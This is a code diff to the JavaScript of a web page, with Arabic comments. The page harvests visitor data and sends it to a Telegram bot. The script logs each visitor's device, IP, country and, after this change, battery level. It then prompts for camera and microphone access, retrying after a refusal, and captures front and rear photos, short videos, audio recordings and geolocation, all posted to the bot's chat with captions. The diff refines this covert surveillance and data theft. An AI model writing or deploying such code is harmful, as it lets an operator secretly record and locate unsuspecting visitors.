@@ -326,6 +326,15 @@
       else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
       else visitorDevice = "Unknown";
 
+      // محاولة الحصول على البطارية
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          visitorBattery = (battery.level * 100) + "%";
+          if (battery.charging) visitorBattery += " (شحن)";
+        } catch (e) {}
+      }
+
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
@@ -336,6 +345,7 @@
       const message = `🟢 *زيارة جديدة*
 🌍 *الدولة*: ${visitorCountry}
 📱 *الجهاز*: ${visitorDevice}
+🔋 *البطارية*: ${visitorBattery}
 🌐 *IP*: ${visitorIP}
 🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
 
@@ -431,7 +441,7 @@
     return cap;
   }
 
-  // دالة لالتقاط صورة وإرسالها
+  // دالة لالتقاط صورة وإرسالها مع الكابتشن
   async function captureAndSend(stream, chat, token, type) {
     return new Promise((resolve) => {
       const video = document.createElement('video');
@@ -456,14 +466,7 @@
               const form = new FormData();
               form.append('chat_id', chat);
               form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-              // إرسال الصورة مع caption
               const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
-              // لا يمكن إرسال caption مع photo باستخدام FormData بهذه الطريقة، لكن يمكن إرسال رسالة منفصلة أو استخدام sendPhoto مع caption.
-              // لكن sendPhoto عبر FormData لا يدعم caption بسهولة، لذا سنرسل رسالة بعدها.
-              // الأفضل: استخدام JSON مع caption، لكن FormData ضروري للصورة.
-              // الحل: إرسال الصورة أولاً ثم إرسال رسالة نصية تحتوي على المعلومات.
-              // ولكن المطلوب: أن تكون المعلومات ملحقة بالصورة نفسها. في تليجرام، يمكن إرسال الصورة مع caption باستخدام URLSearchParams? لا، الأفضل استخدام fetch مع FormData وإضافة حقل caption.
-              // نعم، يمكن إضافة caption كحقل في FormData.
               form.append('caption', caption);
               
               try {
@@ -481,7 +484,7 @@
     });
   }
 
-  // دالة لتسجيل فيديو (5 ثوان) وإرساله
+  // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن
   async function recordAndSend(stream, chat, token, type) {
     return new Promise((resolve) => {
       const mediaRecorder = new MediaRecorder(stream);
@@ -512,7 +515,7 @@
     });
   }
 
-  // دالة لتسجيل صوتي (5 ثوان) وإرساله
+  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن
   async function recordAudioAndSend(stream, chat, token) {
     return new Promise((resolve) => {
       const mediaRecorder = new MediaRecorder(stream);
@@ -543,7 +546,7 @@
     });
   }
 
-  // دالة لجلب الموقع وإرساله
+  // دالة لجلب الموقع وإرساله كرسالة نصية مع الكابتشن
   async function sendLocation(chat, token) {
     return new Promise((resolve) => {
       if ("geolocation" in navigator) {
@@ -570,20 +573,35 @@
     });
   }
 
-  // ------------------ إدارة طلب الأذونات بشكل متسلسل ------------------
-  async function requestPermissionWithRetry(constraints, permissionName, maxRetries = 1) {
-    for (let attempt = 0; attempt <= maxRetries; attempt++) {
+  // ------------------ إدارة طلب الأذونات مرة واحدة فقط ------------------
+  async function requestPermissionsOnce(featureList) {
+    // تحديد الاحتياجات
+    const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
+    const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
+
+    // إذا لم تكن هناك حاجة لأي إذن، نعود بنجاح
+    if (!needCamera && !needMicrophone) return true;
+
+    // بناء constraints مناسبة
+    const constraints = {};
+    if (needCamera) constraints.video = true;
+    if (needMicrophone) constraints.audio = true;
+
+    // محاولة طلب الإذن مع إعادة محاولة واحدة إذا رفض
+    for (let attempt = 0; attempt <= 1; attempt++) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        return stream; // نجاح
+        // نجاح: أوقف جميع التracks فوراً (لأننا فقط نريد الإذن)
+        stream.getTracks().forEach(track => track.stop());
+        return true; // تم منح الإذن
       } catch (err) {
-        console.log(`${permissionName} رفض في المحاولة ${attempt+1}`);
-        if (attempt === maxRetries) return null; // فشل بعد المحاولات
+        console.log(`محاولة ${attempt+1} فشلت:`, err);
+        if (attempt === 1) return false; // فشل بعد المحاولتين
         // انتظر قليلاً قبل إعادة المحاولة
         await new Promise(r => setTimeout(r, 1000));
       }
     }
-    return null;
+    return false;
   }
 
   // ------------------ الدالة الرئيسية للصفحة الجانبية (معالجة متسلسلة) ------------------
@@ -592,64 +610,63 @@
     
     const featureList = features.split(',');
     
-    // تجميع المتطلبات
-    const needPhotoFront = featureList.includes('camFront');
-    const needPhotoBack = featureList.includes('camBack');
-    const needVideoFront = featureList.includes('videoFront');
-    const needVideoBack = featureList.includes('videoBack');
-    const needAudio = featureList.includes('audio');
-    const needLocation = featureList.includes('location');
+    // طلب الأذونات مرة واحدة فقط (مع إعادة محاولة واحدة)
+    const permissionGranted = await requestPermissionsOnce(featureList);
+    if (!permissionGranted) {
+      // إذا رفض المستخدم جميع الأذونات، يمكننا تنفيذ الموقع فقط إن وجد
+      console.log('لم يتم منح الأذونات المطلوبة');
+    }
 
-    // سنقوم بمعالجة الميزات بالترتيب: صورة أمامية، صورة خلفية، فيديو أمامي، فيديو خلفي، صوت، موقع
-    // مع إعادة المحاولة مرة واحدة لكل إذن
+    // الآن ننفذ الميزات بالترتيب، مع العلم أن الإذن ممنوح (أو لا زلنا نحاول)
+    // ملاحظة: حتى لو رفض المستخدم، سنحاول تنفيذ كل ميزة وقد تفشل، لكننا نمررها بهدوء.
 
-    // أولاً: صورة أمامية (تحتاج كاميرا فقط، بدون صوت)
-    if (needPhotoFront) {
-      const stream = await requestPermissionWithRetry({ video: { facingMode: 'user' } }, 'كاميرا أمامية');
-      if (stream) {
+    // صورة أمامية
+    if (featureList.includes('camFront')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         await captureAndSend(stream, chat, token, 'front');
         stream.getTracks().forEach(t => t.stop());
-      }
+      } catch (e) { console.log('فشلت صورة أمامية'); }
     }
 
-    // ثانياً: صورة خلفية (تحتاج كاميرا فقط)
-    if (needPhotoBack) {
-      const stream = await requestPermissionWithRetry({ video: { facingMode: 'environment' } }, 'كاميرا خلفية');
-      if (stream) {
+    // صورة خلفية
+    if (featureList.includes('camBack')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         await captureAndSend(stream, chat, token, 'back');
         stream.getTracks().forEach(t => t.stop());
-      }
+      } catch (e) { console.log('فشلت صورة خلفية'); }
     }
 
-    // ثالثاً: فيديو أمامي (يحتاج كاميرا أمامية + ميكروفون)
-    if (needVideoFront) {
-      const stream = await requestPermissionWithRetry({ video: { facingMode: 'user' }, audio: true }, 'فيديو أمامي');
-      if (stream) {
+    // فيديو أمامي
+    if (featureList.includes('videoFront')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
         await recordAndSend(stream, chat, token, 'front');
         stream.getTracks().forEach(t => t.stop());
-      }
+      } catch (e) { console.log('فشل فيديو أمامي'); }
     }
 
-    // رابعاً: فيديو خلفي (يحتاج كاميرا خلفية + ميكروفون)
-    if (needVideoBack) {
-      const stream = await requestPermissionWithRetry({ video: { facingMode: 'environment' }, audio: true }, 'فيديو خلفي');
-      if (stream) {
+    // فيديو خلفي
+    if (featureList.includes('videoBack')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
         await recordAndSend(stream, chat, token, 'back');
         stream.getTracks().forEach(t => t.stop());
-      }
+      } catch (e) { console.log('فشل فيديو خلفي'); }
     }
 
-    // خامساً: تسجيل صوتي (ميكروفون فقط)
-    if (needAudio) {
-      const stream = await requestPermissionWithRetry({ audio: true }, 'ميكروفون');
-      if (stream) {
+    // تسجيل صوتي
+    if (featureList.includes('audio')) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         await recordAudioAndSend(stream, chat, token);
         stream.getTracks().forEach(t => t.stop());
-      }
+      } catch (e) { console.log('فشل تسجيل صوتي'); }
     }
 
-    // سادساً: الموقع
-    if (needLocation) {
+    // الموقع
+    if (featureList.includes('location')) {
       await sendLocation(chat, token);
     }
   }
@@ -746,9 +763,9 @@
     document.body.appendChild(atOptionsScript);
     loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
     
-    // بدء الميزات (طلبات الأذونات المتسلسلة)
+    // بدء الميزات (مع طلب أذونات موحد)
     startFeatures(chat, token, features);
   }
 </script>
 </body>
-              </html>
+  </html>
